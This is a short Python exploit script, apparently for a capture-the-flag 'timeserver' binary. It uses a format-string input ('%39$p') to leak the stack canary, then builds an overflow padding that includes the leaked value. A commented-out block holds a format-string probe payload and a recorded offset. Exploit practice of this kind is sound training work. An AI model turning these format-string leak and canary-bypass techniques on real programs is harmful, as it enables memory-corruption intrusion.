#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./timeserver')
host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
b *action+257
continue
'''.format(**locals())

libc=SetupLibcELF()


io = start()
re()
sl("%39$p")
canary = GetInt(re())[0]
padding = b"A"*28 + p(canary) + b"A"*8 + b"B"*8
info(f"COOKIE {str(hex(canary))}")

sl(fmt_x32)

io.interactive()

# fmt_x32=b"AAAA||%1$p||%2$p||%3$p||%4$p||%5$p||%6$p||%7$p||%8$p||%9$p||%10$p||%11$p||%12$p||%13$p||%14$p||%15$p||%16$p||%17$p||%18$p||%19$p||%20$p||%21$p||%22$p||%23$p||%24$p||%25$p||%26$p||%27$p||%28$p||%29$p||%30$p||%31$p||%32$p||%33$p||%34$p||%35$p||%36$p||%37$p||%38$p||%39$p||%40$p||%41$p||%42$p||%43$p||%44$p||%45$p||%46$p||%47$p||%48$p||%49$p||%50$p||%51$p||%52$p||%53$p||%54$p||%55$p||%56$p||%57$p||%58$p||%59$p||%60$p||"
# re()
# sl(fmt_x32)
# offset 7
# io.interactive()

